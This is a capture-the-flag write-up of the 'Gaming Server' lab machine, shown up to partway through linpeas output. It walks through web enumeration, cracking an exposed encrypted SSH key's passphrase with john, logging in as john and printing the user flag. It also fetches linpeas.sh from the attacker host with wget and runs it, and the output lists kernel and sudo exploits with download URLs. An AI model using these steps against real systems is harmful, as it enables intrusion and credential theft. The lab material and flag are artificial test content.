# Gaming Server

Laurent Chauvin | November 04, 2022

## Resources

[1] https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

## Progress

```
export IP=10.10.27.3
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 22:10 EDT
Nmap scan report for 10.10.27.3
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.27.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/04 22:10:57 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://10.10.27.3/uploads/]
/secret               (Status: 301) [Size: 309] [--> http://10.10.27.3/secret/]

```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.27.3
+ Target Hostname:    10.10.27.3
+ Target Port:        80
+ Start Time:         2022-11-04 22:11:03 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: aca, size: 59e40b71bc7ab, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: /secret/: Directory indexing found.
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-11-04 22:28:02 (GMT-4) (1019 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

In 'robots.txt'
```
user-agent: *
Allow: /
/uploads/
```

Upload directory
```
[ ]	dict.lst	2020-02-05 14:10 	2.0K	 
[TXT]	manifesto.txt	2020-02-05 13:05 	3.0K	 
[IMG]	meme.jpg	2020-02-05 13:32 	15K	 
```

Let's get these files.
```
wget $IP/uploads/dict.lst
wget $IP/uploads/manifesto.txt
wget $IP/uploads/meme.jpg
```

File ```dict.lst``` is a list of passwords.

File ```manifesto.txt``` seems like a hacker manifesto, not sure if anything useful in there for now.

File ```meme.jpg``` is an image. Steganographie? Let's put this aside for now.

In the source code of the website we can find
```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

John might be a ssh username. Maybe bruteforce it with hydra.

Let's check '/secret' first.

It seems to contain an ssh private key
```
[ ]	secretKey	2020-02-05 13:41 	1.7K	 
```

Let's get it.
```
wget $IP/secret/secretKey
```

It's a private key indeed
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

Encrypted. Let's convert it and pass it to john.
```
ssh2john secretKey > secretKey_forJohn.txt 
john secretKey_forJohn.txt --wordlist=/opt/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2022-11-04 22:22) 25.00g/s 12800p/s 12800c/s 12800C/s genesis..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Let's try to connect with it.
```
chmod 600 secretKey       
ssh -i secretKey john@$IP

Enter passphrase for key 'secretKey': letmein
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov  5 02:23:31 UTC 2022

  System load:  0.23              Processes:           106
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 34%               IP address for eth0: 10.10.27.3
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
```

We're in. Let's get flag.

```
cat user.txt 

a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

Time to privesc.

Started a python server to upload linpeas.sh
```
python -m http.server
```

Then on the remote
```
wget 10.18.23.136/linpeas.sh
```

```chmod +x linpeas.sh``` and execute
```


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.15.0-76-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020
User & Groups: uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
Hostname: exploitable
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                          
Linux version 4.15.0-76-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020                                                                                    
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.21p2                                                                                                                                                                                                                       

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                                                                          
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Sat Nov  5 02:34:10 UTC 2022                                                                                                                                                                                                                
 02:34:10 up 25 min,  1 user,  load average: 0.80, 0.24, 0.26

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
UUID=dd676fd7-ef1b-4b4b-8ddb-6174d3b217dc       /       ext4    defaults        0 0                                                                                                                                                         

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                                                                                                             
HISTFILESIZE=0
MAIL=/var/mail/john
USER=john
SSH_CLIENT=10.18.23.136 49212 22
SHLVL=1
HOME=/home/john
OLDPWD=/home/john
SSH_TTY=/dev/pts/0
LOGNAME=john
_=./linpeas.sh
XDG_SESSION_ID=4
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/dev/shm
SSH_CONNECTION=10.18.23.136 49212 10.10.27.3 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                      
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2021-4034] PwnKit                                                                                                                                                                                                                  

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
                                                                                                                                                                                                                                            
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                                                                                               

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present
/usr/bin/lxc                                                                                                                                                                                                                                
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0370f92f97d7ed6d8                                                                                                                                                                                                               
instance-action: none
instance-id: i-09fb32fcb06130cd2
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{                                                                                                                                                                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2022-11-05T02:08:26Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:fe:c7:6a:ce:b3/                                                                                                                                                                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                                                                                                            

══╣ User Data
                                                                                                                                                                                                                                            

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                 
root         1  0.5  1.7 159596  8688 ?        Ss   02:08   0:08 /sbin/init maybe-ubiquity                                                                                                                                                  
root       413  0.1  2.7 111288 13364 ?        S<s  02:08   0:02 /lib/systemd/systemd-journald
root       437  0.0  0.3  97708  1680 ?        Ss   02:08   0:00 /sbin/lvmetad -f
root       439  0.2  0.8  45368  4000 ?        Ss   02:08   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.6 141932  3016 ?        Ssl  02:08   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   676  0.0  1.0  80048  5056 ?        Ss   02:09   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   692  0.0  0.9  70636  4900 ?        Ss   02:09   0:00 /lib/systemd/systemd-resolved
root       771  0.0  1.3 286256  6648 ?        Ssl  02:09   0:00 /usr/lib/accountsservice/accounts-daemon[0m
message+   772  0.0  0.8  50052  4320 ?        Ss   02:09   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
daemon[0m     786  0.0  0.4  28332  2212 ?        Ss   02:09   0:00 /usr/sbin/atd -f
syslog     788  0.0  0.8 263040  4228 ?        Ssl  02:09   0:00 /usr/sbin/rsyslogd -n
root       791  0.0  1.2  70644  6004 ?        Ss   02:09   0:00 /lib/systemd/systemd-logind
root       801  0.1  3.2 169100 15756 ?        Ssl  02:09   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       804  0.0  0.6  30028  2992 ?        Ss   02:09   0:00 /usr/sbin/cron -f
root       807  0.0  0.3 613152  1676 ?        Ssl  02:09   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       808  0.8  4.9 557368 24228 ?        Ssl  02:09   0:12 /usr/lib/snapd/snapd
root       818  0.0  1.3 291468  6716 ?        Ssl  02:09   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       821  0.0  0.4  14664  2120 ttyS0    Ss+  02:09   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       829  0.0  0.3  14888  1668 tty1     Ss+  02:09   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       837  0.0  1.2  72300  6232 ?        Ss   02:09   0:00 /usr/sbin/sshd -D
john      1667  0.0  0.8 108096  4100 ?        S    02:28   0:00      _ sshd: john@pts/0
john      1668  0.0  1.0  21460  5384 pts/0    Ss   02:28   0:00          _ -bash
john      1696  0.1  0.5   5512  2576 pts/0    S+   02:33   0:00              _ /bin/sh ./linpeas.sh
john      5259  0.0  0.1   5512   980 pts/0    S+   02:34   0:00                  _ /bin/sh ./linpeas.sh
john      5263  0.0  0.7  38528  3596 pts/0    R+   02:34   0:00                  |   _ ps fauxwww
john      5262  0.0  0.1   5512   980 pts/0    S+   02:34   0:00                  _ /bin/sh ./linpeas.sh
root       862  0.1  3.0 185944 15156 ?        Ssl  02:09   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
